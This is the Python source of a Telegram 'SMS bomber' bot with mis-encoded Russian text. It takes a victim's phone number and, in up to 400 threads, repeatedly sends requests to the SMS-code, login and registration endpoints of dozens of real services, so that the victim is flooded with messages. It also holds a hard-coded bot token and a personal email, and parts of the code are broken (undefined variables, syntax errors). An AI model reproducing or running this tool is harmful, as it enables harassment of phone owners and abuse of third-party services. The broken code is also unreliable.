 # coding=utf8
import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time


# –ù—É–∂–Ω–æ –≤–ø–∏—Å–∞—Ç—å —Ç–æ–∫–µ—Ç —Å–≤–æ–µ–≥–æ –±–æ—Ç–∞.
TOKEN = '772006356:AAGX_VubxlywRZLzRpU1GBKFKy8DTTZ653I'

# –ú–æ–∂–Ω–æ —É–º–µ–Ω—å—à–∏—Ç—å –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫–æ–≤-–∏—Å–ø–æ–ª–Ω–∏—Ç–µ–ª–µ–º —ç—Ç–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π. –ù–µ –∑–Ω–∞—é –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ —Å–∏—Å—Ç–µ–º—ã —Ç–∞–∫ —á—Ç–æ —Å—Ç–∞–≤–ª—é 20
THREADS_LIMIT = 400

chat_ids_file = 'chat_ids.txt'

# –ù—É–∂–Ω–æ –≤–ø–∏—Å–∞—Ç—å –∞–π–¥–∏ –∞–¥–º–∏–Ω—Å–∫–æ–≥–æ —á–∞—Ç–∞
ADMIN_CHAT_ID = 998991611

# –≠—Ç–∏ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –ª—É—á—à–µ –Ω–µ –º–µ–Ω—è—Ç—å
users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def save_chat_id(chat_id):
    "–§—É–Ω–∫—Ü–∏—è –¥–æ–±–∞–≤–ª—è–µ—Ç —á–∞—Ç –∞–π–¥–∏ –≤ —Ñ–∞–π–ª –µ—Å–ª–∏ –µ–≥–æ —Ç–∞–º –Ω–µ—Ç—É"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='üî•üí£–ë–û–ú–ë–ï–†')
    stop = types.KeyboardButton(text='–°—Ç–æ–ø –°–ø–∞–º')
    info = types.KeyboardButton(text='‚ÑπÔ∏è–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
    stats = types.KeyboardButton(text='üìà–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')
    donat = types.KeyboardButton(text='üí∞–ü–æ–¥–¥–µ—Ä–∂–∞—Ç—å')
    piar = types.KeyboardButton(text='üí∏ –†–µ–∫–ª–∞–º–∞')
    faq = types.KeyboardButton(text='FAQ / –°–æ–≥–ª–∞—à–µ–Ω–∏–µ')

    buttons_to_add = [boom, stop, info, stats, donat, piar, faq]

    if int(message.chat.id) == ADMIN_CHAT_ID:
        buttons_to_add.append(types.KeyboardButton(text='–†–∞—Å—Å—ã–ª–∫–∞'))

    keyboard.add(*buttons_to_add)
    bot.send_message(message.chat.id, '–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—åüôã‚Äç‚ôÇ!\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:',  reply_markup=keyboard)
    save_chat_id(message.chat.id)


def send_for_number(phone):
        request_timeout = 0.00001
        try:
            requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + _phone})
        except Exception as e:
            pass
        except Exception as e:
            pass
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': self.formatted_phone})
        except Exception as e:
            pass
        try:
            requsets.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': self.sms_text, 'phone': self.formatted_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                              params={'pageName': 'registerPrivateUserPhoneVerification'}, data={'phone': phone})
        except Exception as e:
            pass
        try:
            requests.post('https://api-ru-manage.voximplant.com/api/AddAccount',data={'region': 'eu', 'account_name': _name, 'language_code': 'en','account_email': _name + '@gmail.com', 'account_password': _name})
        except Exception as e:
            pass
        try:
            requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
        except Exception as e:
            pass
        try:
            requests.get(' https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
        except Exception as e:
            pass
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
        except Exception as e:
            pass
        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
        except Exception as e:
            pass
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
        except Exception as e:
            pass
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': '–ò–≤–∞–Ω', 'lastName': '–ò–≤–∞–Ω–æ–≤', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        except Exception as e:
            pass
        try:
            requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7','mobilePhone.areaCode': _phone[1:4], 'mobilePhone.localNumber': _phone[4:-1]})
        except Exception as e:
            pass
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phoneGorzdrav, 'CSRFToken': '*'})	
        except Exception as e:
            pass
        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'–ò–≤–∞–Ω','middleName':'–ò–≤–∞–Ω–æ–≤–∏—á','lastName':'–ò–≤–∞–Ω–æ–≤','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        except Exception as e:
            pass
        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.–ó–∞—è–≤–∫–∞–ù–∞–§–∏–∑–∏–∫–∞','params':{'phone':_phone},'id':'1'})
        except Exception as e:
            pass
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
        except Exception as e:
            pass
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})  
        except Exception as e:
            pass
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone}).json()[]
        except Exception as e:
            pass
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        except Exception as e:
            pass
        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
        except Exception as e:
            pass
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        except Exception as e:
            pass
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
        except Exception as e:
            pass
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        except Exception as e:
            pass

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone})
        except Exception as e:
            pass

        try:   
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
        except Exception as e:
            pass

        try:  
            requests.post('https://online-api.dozarplati.com/rpc', json={'id': 1, 'jsonrpc': '2.0', 'method': 'auth.login', 'params': {'phoneNumber': phone}})
        except Exception as e:
            pass

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone})
        except Exception as e:
            pass                                              

        try:    
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                                        'client': {'firstName': '–ò–≤–∞–Ω', 'lastName': '–ò–≤–∞–Ω–æ–≤', 'phone': phone,
                                                       'typeKeys': ['Unemployed']}},
                                                                                              'query': 'mutation registration($client: ClientInput!) {'
                                                                                                       '\n  registration(client: $client) {'
                                                                                                       '\n    token\n    __typename\n  }\n}\n'})
        except Exception as e:
            pass

        try:    
            requests.get('https://api.pswallet.ru/system/smsCode', params={'mobile': phone, 'type': '0'})
        except Exception as e:
            pass
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
        except Exception as e:
            pass

        try:    
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone})
        except Exception as e:
            pass
        try:    
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone}, headers={'App-ID': 'cabinet'}) 
        except Exception as e:
            pass

        try:                                                
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone})
        except Exception as e:
            pass
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone, 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11;                     Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
        except Exception as e:
            pass

        try:
            a=requests.get('https://driver.gett.ru/signup/')
            requests.post('https://driver.gett.ru/api/login/phone/', data = {'phone':phone,'registration':'true'}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'csrftoken='+a.cookies['csrftoken']+'; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2','Host':'driver.gett.ru','Referer':'https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-CSRFToken':a.cookies['csrftoken']})
        except Exception as e:
            pass

        try:    
            requests.post('https://api-production.viasat.ru/api/v1/auth_codes', data = {'msisdn':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'ru','Connection':'keep-alive','Host':'api-production.viasat.ru','Origin':'https://vipplay.ru','Referer':'https://vipplay.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
        except Exception as e:
            pass

        try:
            requests.post('https://www.maxidom.ru/ajax/doRegister.php?RND=0.6416262061536506',data = {:phone,},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'www.maxidom.ru', 'origin':'https://www.maxidom.ru/','Referer':'https://www.maxidom.ru/ajax/doRegister.php?RND=0.6416262061536506'})
        except Exception as e:
            pass


        try:
            requests.post('https://youla.ru/web-api/auth/request_code',data = {:phone},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'youla.ru', 'origin':'https://youla.ru','Referer':'https://youla.ru/surgut'})
        except Exception as e:
            pass

        try:    
            requests.post('https://beta.delivery-club.ru/api/user/otp',data = {:phone},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'beta.delivery-club.ru', 'origin':'https://beta.delivery-club.ru','Referer':'https://beta.delivery-club.ru/entities/food?authPopupOpened=1'})
        except Exception as e:
            pass

        try:    
            requests.post('https://api.sunlight.net/v3/customers/authorization/',data = {:phone},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.sunlight.net', 'origin':'https://sunlight.net/','Referer':'https://sunlight.net/profile/login/?next=/profile/'})
        except Exception as e:
            pass

        try:    
            requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone=79821432646',data = {"phone":phone,"oper":"9"},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'register.sipnet.ru', 'origin':'https://www.sipnet.ru/','Referer':'https://www.sipnet.ru/tarify-ip-telefonii'})
        except Exception as e:
            pass

        try:    
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/',data = {:phone},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.ivi.ru', 'origin':'https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile'})
        except Exception as e:
            pass

        try:    
            requests.post('https://koronapay.com/transfers/online/api/users/otps',data = {:phone},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'koronapay.com', 'origin':'https://koronapay.com','Referer':'https://koronapay.com/transfers/online/login'})
        except Exception as e:
            pass

        try:
            b = requests.session()
            b.get('https://drugvokrug.ru/siteActions/processSms.htm')
            requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+b.cookies['JSESSIONID']+';','Host':'drugvokrug.ru','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
        except Exception as e:
            pass

        try:
            requests.post('https://api-production.viasat.ru/api/v1/auth_codes', data = {'msisdn':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'ru','Connection':'keep-alive','Host':'api-production.viasat.ru','Origin':'https://vipplay.ru','Referer':'https://vipplay.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'}) 
        except Exception as e:
            pass

        try:
            requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Host':'b.utair.ru','origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
        except Exception as e:
            pass

        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone, 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
        except Exception as e:
            pass



def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    if force:
        msg = f'–°–ø–∞–º –∑–∞–ø—É—â–µ–Ω –Ω–∞ –Ω–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–æ–µ –≤—Ä–µ–º—è –¥–ª—è –Ω–æ–º–µ—Ä–∞ +{phone_number}'
    else:
         msg = f'–°–ø–∞–º –∑–∞–ø—É—â–µ–Ω –Ω–∞ 20 –º–∏–Ω—É—Ç –Ω–∞ –Ω–æ–º–µ—Ä +{phone_number}'

    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes = 20)
    while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, f'–°–ø–∞–º –Ω–∞ –Ω–æ–º–µ—Ä {phone_number} –∑–∞–≤–µ—Ä—à—ë–Ω')
    THREADS_AMOUNT[0] -= 1 # —Å—Ç–æ—è–ª–æ 1
    try:
        running_spams_per_c–∑–Ωhat_id.remove(chat_id)
    except Exception:
        pass


def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, '–í—ã —É–∂–µ –Ω–∞—á–∞–ª–∏ —Ä–∞—Å—Å—ã–ª–∫—É —Å–ø–∞–º–∞. –î–æ–∂–¥–∏—Ç–µ—Å—å –æ–∫–æ–Ω—á–∞–Ω–∏—è –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ –°—Ç–æ–ø –°–ø–∞–º –∏ –ø–æ—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞')
        return

    # –ï—Å–ª–∏ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç—Ä–µ–¥–æ–≤ –º–µ–Ω—å—à–µ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ —Å–æ–∑–¥–∞–µ—Ç—Å—è –Ω–æ–≤—ã–π –∫–æ—Ç–æ—Ä—ã–π –∑–∞–Ω–∏–º–∞–µ—Ç—Å—è —Å–ø–∞–º–æ–º
    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, '–°–µ—Ä–≤–µ—Ä–∞ —Å–µ–π—á–∞—Å –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω—ã. –ü–æ–ø—ã—Ç–∞–π—Ç–µ—Å—å —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç')
        print('–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç—Ä–µ–¥–æ–≤ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è. –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text

    if text == '‚ÑπÔ∏è–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è':
        bot.send_message(chat_id, '–°–æ–∑–¥–∞—Ç–µ–ª—å –±–æ—Ç–∞: @ATrild\n–ü–æ –≤–æ–ø—Ä–æ—Å–∞–º —Å–æ—Ç—Ä—É–¥–Ω–∏—á–µ—Å—Ç–≤–∞ –æ–±—Ä–∞—â–∞—Ç—å—Å—è –≤ –õ–° –∫ —Å–æ–∑–¥–∞—Ç–µ–ª—é –±–æ—Ç–∞')

    elif text == 'üî•üí£–ë–û–ú–ë–ï–†':
        bot.send_message(chat_id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –±–µ–∑ + –≤ —Ñ–æ—Ä–º–∞—Ç–µ:\nüá∫üá¶ 380xxxxxxxxx\nüá∑üá∫ 79xxxxxxxxx')

    elif text == 'üìà–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞':
        bot.send_message(chat_id, f'üìä–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏üì°!\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–πüôé‚Äç‚ôÇ: {users_amount[0]}\n–°–µ—Ä–≤–∏—Å–æ–≤ –¥–ª—è RUüá∑üá∫: 300\n–°–µ—Ä–≤–∏—Å–æ–≤ –¥–ª—è UKüá∫üá¶: 51\n–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω: 12.06.2019')

    elif text == 'üí∞–ü–æ–¥–¥–µ—Ä–∂–∞—Ç—å':
        bot.send_message(chat_id, '–†–µ–±—è—Ç–∞, –∫—Ç–æ –º–æ–∂–µ—Ç –º–∞—Ç–µ—Ä–∏–∞–ª—å–Ω–æ –ø–æ–º–æ—á—å –Ω–∞ —Ä–∞–∑–≤–∏—Ç–∏–µ –±–æ—Ç–∞\n–í–æ—Ç —Ä–µ–∫–≤–∏–∑–∏—Ç—ã\nQIWI ATrild')
    
    elif text == 'üí∏ –†–µ–∫–ª–∞–º–∞':
        bot.send_message(chat_id, '–í –ù–∞—à–µ–º –ë–æ—Ç–µ 1 —Ä–∞—Å—Å—ã–ª–∫–∞ —Å—Ç–æ–∏—Ç  100 —Ä—É–±–ª–µ–π\n–ï–µ –ø–æ–ª—É—á–∞—Ç –≤—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –±–æ—Ç–∞\n–ü–æ –≤–æ–ø—Ä–æ—Å–∞–º –ø–æ–∫—É–ø–∫–∏ –ø–∏—Å–∞—Ç—å @ATrild')    

    elif text == '–†–∞—Å—Å—ã–ª–∫–∞' and chat_id==ADMIN_CHAT_ID:
        bot.send_message(chat_id, '–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: "–†–ê–ó–û–°–õ–ê–¢–¨: –≤–∞—à_—Ç–µ–∫—Å—Ç" –±–µ–∑ –∫–∞–≤—ã—á–µ–∫')

    elif text == 'FAQ / –°–æ–≥–ª–∞—à–µ–Ω–∏–µ':
        bot.send_message(chat_id, '"Andromeda" –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç—Å—è –í–∞—à–µ–º—É –≤–Ω–∏–º–∞–Ω–∏—é –ø—Ä–∏ —É—Å–ª–æ–≤–∏–∏ –í–∞—à–µ–≥–æ –ø–æ–ª–Ω–æ–≥–æ —Å–æ–≥–ª–∞—Å–∏—è —Å–æ –≤—Å–µ–º–∏ –ø—Ä–∞–≤–∏–ª–∞–º–∏. –ü—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –¥–∞–Ω–Ω–æ–≥–æ —Å–µ—Ä–≤–∏—Å–∞ –∫–∞–∫–∏–º-–ª–∏–±–æ –æ–±—Ä–∞–∑–æ–º –í—ã –¥–∞–µ—Ç–µ —Å–æ–≥–ª–∞—Å–∏–µ –¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å –≤ —Ä–∞–º–∫–∞—Ö –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ —Å–æ–≥–ª–∞—à–µ–Ω–∏—è\n–ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨–°–ö–û–ï –°–û–ì–õ–ê–®–ï–ù–ò–ï\n1.–ù–∞—Å—Ç–æ—è—â–µ–µ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–µ —Å–æ–≥–ª–∞—à–µ–Ω–∏–µ (–¥–∞–ª–µ–µ ‚Äì –°–æ–≥–ª–∞—à–µ–Ω–∏–µ) –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ —Å–µ—Ä–≤–∏—Å—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–æ-—Ä–∞–∑–≤–ª–µ–∫–∞—Ç–µ–ª—å–Ω–æ–≥–æ —Ä–µ—Å—É—Ä—Å–∞ "Andromeda"\n2.–î–æ—Å—Ç—É–ø –∫ —Å–µ—Ä–≤–∏—Å—É –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è –Ω–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ–π –æ—Å–Ω–æ–≤–µ.\n3."Andromeda" —Å–µ—Ä–≤–∏—Å –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –¥–ª—è —Ä–∞–∑–≤–ª–µ–∫–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π.\n4.–ù–∞ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—é —Å–µ—Ä–≤–∏—Å–∞ –Ω–µ –≤–æ–∑–ª–∞–≥–∞–µ—Ç—Å—è –∫–∞–∫–∏—Ö-–ª–∏–±–æ –æ–±—è–∑–∞—Ç–µ–ª—å—Å—Ç–≤ –ø–µ—Ä–µ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏.\n5.–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è —Å–∞–π—Ç–∞ –Ω–µ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –≤—Å—Ç—Ä–µ—á–Ω—ã–µ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏—è –æ—Ç –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –∏–∑–º–µ–Ω–µ–Ω–∏–π –Ω–∞—Å—Ç–æ—è—â–µ–≥–æ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ —Å–æ–≥–ª–∞—à–µ–Ω–∏—è.\n6.–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è —Å–µ—Ä–≤–∏—Å–∞ "Andromeda" –ù–µ –Ω–µ—Å–µ—Ç –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏ –∑–∞ –ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—ã–π —É—â–µ—Ä–± —Ç—Ä–µ—Ç—å–∏–º –ª–∏—Ü–∞–º –ø–æ–ø–∞–≤—à–∏—Ö –ø–æ–¥ –≤–ª–∏—è–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–∞.\n–°–ø–∞—Å–∏–±–æ –∑–∞ –≤–Ω–∏–º–∞–Ω–∏–µ!')

    
    elif text == '–°—Ç–æ–ø –°–ø–∞–º':
        if chat_id not in running_spams_per_chat_id:
            bot.send_message(chat_id, '–í—ã –µ—â–µ –Ω–µ –Ω–∞—á–∏–Ω–∞–ª–∏ —Å–ø–∞–º')
        else:
            running_spams_per_chat_id.remove(chat_id)

    elif '–†–ê–ó–û–°–õ–ê–¢–¨: ' in text and chat_id==ADMIN_CHAT_ID:
        msg = text.replace("–†–ê–ó–û–°–õ–ê–¢–¨: ","")
        send_message_users(msg)

    elif len(text) == 11:
        phone = text
        spam_handler(phone, chat_id, force=False)


    elif len(text) == 12:
        phone = text
        spam_handler(phone, chat_id, force=False)



    elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
        phone = text[1:]
        spam_handler(phone, chat_id, force=True)

    else:
        bot.send_message(chat_id, f'–ù–æ–º–µ—Ä –≤–≤–µ–¥–µ–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –í–≤–µ–¥–µ–Ω–æ {len(text)} —Å–∏–º–≤–æ–ª–æ–≤, –æ–∂–∏–¥–∞–µ—Ç—Å—è 11')
        print(f'–ù–æ–º–µ—Ä –≤–≤–µ–¥–µ–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –í–≤–µ–¥–µ–Ω–æ {len(text)} —Å–∏–º–≤–æ–ª–æ–≤, –æ–∂–∏–¥–∞–µ—Ç—Å—è 11')

if __name__ == '__main__':
    bot.polling(none_stop=True)
